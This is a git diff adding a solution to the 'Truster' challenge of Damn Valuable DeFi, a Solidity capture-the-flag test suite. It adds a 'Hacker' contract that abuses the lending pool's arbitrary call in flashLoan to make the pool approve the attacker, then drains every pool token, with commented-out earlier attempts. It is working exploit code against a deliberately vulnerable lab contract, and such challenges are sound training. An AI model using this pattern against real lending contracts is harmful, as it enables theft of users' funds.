@@ -6,6 +6,27 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract Hacker {
+    constructor(
+        address recovery,
+        DamnValuableToken token,
+        TrusterLenderPool lender,
+        uint256 amount
+    ) {
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            amount
+        );
+        // console.log("Will call thing;");
+        lender.flashLoan(0, address(this), address(token), data);
+        // console.log("Thing returned. Lender has: ", token.balanceOf(address(lender)));
+        // console.log("STEALING:                   ", amount);
+        token.transferFrom(address(lender), recovery, amount);
+        // console.log("Stolen;");
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -27,6 +48,7 @@ contract TrusterChallenge is Test {
      * SETS UP CHALLENGE - DO NOT TOUCH
      */
     function setUp() public {
+        // console.log("setUp function: ", msg.sender);
         startHoax(deployer);
         // Deploy token
         token = new DamnValuableToken();
@@ -51,7 +73,21 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // solution 1 (not working - not designed to work).
+        //  bytes memory data = abi.encodeWithSignature("receivedLoan()");
+        //  pool.flashLoan(TOKENS_IN_POOL, address(this), address(this), data);
+        //  console.log("Function done");
+
+        // Solution2: we can spend POOL tokens. Doesn't work, assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
+
+        // console.log("Should call against: ", address(token));
+        // bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, type(uint256).max);
+        // pool.flashLoan(0, player, address(token), data);
+        // // uint256 amount, address borrower, address target, bytes calldata data
+        // console.log("Loan OK, time to steal.");
+        // token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+
+        Hacker h = new Hacker(recovery, token, pool, TOKENS_IN_POOL);
     }
 
     /**
